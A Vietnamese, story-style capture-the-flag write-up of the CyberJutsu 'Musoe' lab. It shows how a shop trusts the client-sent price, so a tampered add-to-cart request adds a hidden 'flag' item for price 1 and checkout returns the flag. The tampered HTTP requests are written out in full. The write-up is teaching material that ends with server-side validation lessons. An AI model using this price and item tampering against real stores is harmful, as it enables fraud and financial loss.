# CBJS Lab — Musoe (Buy-the-Flag)  
**Write-up (story mode)**

> Một chuyến ghé thăm *Musoe* — nơi mọi thứ có thể được mua bán, kể cả những điều kỳ quặc nhất.  
> Chủ đề: lỗi logic cửa hàng (client-trust), tampering request, checkout → mua được flag.

---

## Table of Contents
- [1. Câu chuyện bắt đầu](#1-câu-chuyện-bắt-đầu)
- [2. Thăm dò ngôi làng (Recon)](#2-thăm-dò-ngôi-làng-recon)
- [3. Cửa hàng bí mật (Analysis)](#3-cửa-hàng-bí-mật-analysis)
- [4. Trò nghịch ngợm (Tampering)](#4-trò-nghịch-ngộm-tampering)
- [5. Thanh toán và nhận kho báu (Exploitation)](#5-thanh-toán-và-nhận-kho-báu-exploitation)
- [6. Kết thúc câu chuyện (Conclusion)](#6-kết-thúc-câu-chuyện-conclusion)
- [Appendix — Requests & Notes](#appendix--requests--notes)

---

## 1. Câu chuyện bắt đầu

Một đêm lang thang trong thế giới CTF, mình mở bản đồ và thấy một lab tên **Musoe** thuộc hệ thống *CyberJutsu Lab*. Có một hint: **“flag can be bought in the shop.”**  

Ý nghĩ đầu tiên: *Ai lại bán flag công khai?* Nhưng một hint là hint — mình quyết định đi thử.

Mình truy cập:
```
https://musoe.cyberjutsu-lab.tech/
```

Giao diện hiện ra giống một cửa hàng nhỏ: Home, Shop, Cart — nhìn rất bình thường.

---

## 2. Thăm dò ngôi làng (Recon)

Mình click vào **Shop** và thấy danh sách mặt hàng cùng giá tiền. Không có item tên `flag` trong danh sách.  

Tuy nhiên mình bật **Burp Suite**, chọn Proxy → Intercept, và thử **Add to cart** một món hàng (ví dụ `bread`).

Quan sát request:

```http
POST /cart/add HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
Content-Type: application/json

{
  "item": "bread",
  "price": 5
}
```

Điều đáng chú ý: **giá (price)** được gửi từ client. Server dường như tin dữ liệu client gửi về giá cả.

Trong đầu mình lóe lên một ý: *nếu server chấp nhận giá do client gửi, liệu mình có thể gửi item tùy ý (ví dụ "flag") với giá rẻ không?*

---

## 3. Cửa hàng bí mật (Analysis)

Trước khi làm liều, mình thử thêm một vài thao tác khảo sát:

- Thêm nhiều item khác nhau, thay giá, xem server trả về gì.
- Tìm xem checkout yêu cầu gì (cookie/session, token, hay chỉ dựa vào cart server-side).
- Dò xem có endpoint `/admin` hay `/items` trả JSON liệt kê items không.

Một vài phát hiện:
- Add-to-cart trả về message `Added <item> to your cart!` khi payload hợp lệ.
- Cart có thể được xem bằng endpoint `/cart` (GET) và trả về nội dung cart hiện tại.
- Checkout endpoint là `/cart/checkout` (POST) — mình chưa thử checkout vì muốn đảm bảo mình bỏ item "flag" vào cart trước.

---

## 4. Trò nghịch ngợm (Tampering)

Mình quyết định thử payload “mua” item tên `flag`. Sửa body request như sau và gửi bằng Burp Repeater:

```http
POST /cart/add HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
Content-Type: application/json

{
  "item": "flag",
  "price": 1
}
```

Response:
```
Added flag to your cart!
```

Tức thì mình mở `/cart` để kiểm tra nội dung:

```http
GET /cart HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
```

Response (ví dụ):
```json
{
  "cart": [
    {"item": "bread", "price": 5},
    {"item": "flag", "price": 1}
  ],
  "total": 6
}
```

Cart đã có `flag` — rõ ràng server không validate `item`/`price` kỹ lắm.

> Lưu ý: một số lab thiết kế để `flag` không hiện trong shop UI nhưng server chấp nhận item nếu client gửi đúng tên — đó chính là bài học: **không tin tưởng dữ liệu client gửi**.

---

## 5. Thanh toán và nhận kho báu (Exploitation)

Bước tiếp theo là checkout. Mình gửi request checkout (bằng Burp Repeater):

```http
POST /cart/checkout HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
Content-Type: application/json
Cookie: session=abcdef123456

{}
```

Server trả một response text (hoặc JSON) chứa flag:

```
Congratulations! Here is your prize:
cbjs{y0u_b0ught_th3_flag}
```

Hoặc định dạng khác — nhưng flag đã xuất hiện trực tiếp sau khi checkout thành công.

Mình chụp lại request/response, lưu bằng chứng (screenshot Burp Repeater + `/cart` JSON + flag), và copy flag vào notebook.

---

## 6. Kết thúc câu chuyện (Conclusion)

Từ một hint “flag mua được ở shop”, mình chỉ cần:
- Tìm các điểm server dựa vào dữ liệu client (price/item).
- Thêm item `flag` bằng tampering request.
- Checkout để nhận flag.

**Bài học rút ra**
- Tuyệt đối **không tin tưởng dữ liệu client gửi** cho các logic tài chính/giao dịch.
- Tất cả giá cả, quyền, status, item-sensitive phải được kiểm tra và xác thực server-side.
- Trong môi trường thật, lỗi này có thể dẫn tới gian lận, mất mát tài chính hoặc rò rỉ dữ liệu nhạy cảm.

---

## Appendix — Requests & Notes

### Add to cart (tampered)
```http
POST /cart/add HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
Content-Type: application/json

{
  "item": "flag",
  "price": 1
}
```

### View cart
```http
GET /cart HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
Cookie: session=abcdef123456
```

### Checkout
```http
POST /cart/checkout HTTP/1.1
Host: musoe.cyberjutsu-lab.tech
Content-Type: application/json
Cookie: session=abcdef123456

{}
```

### Evidence to include in write-up
- Screenshot Burp Intercept / Repeater của request `POST /cart/add` (trước và sau chỉnh).  
- Screenshot JSON `GET /cart` cho thấy `flag` trong giỏ.  
- Screenshot response `POST /cart/checkout` chứa flag.  
- Ghi chú: không chia sẻ secret/private data trên write-up.
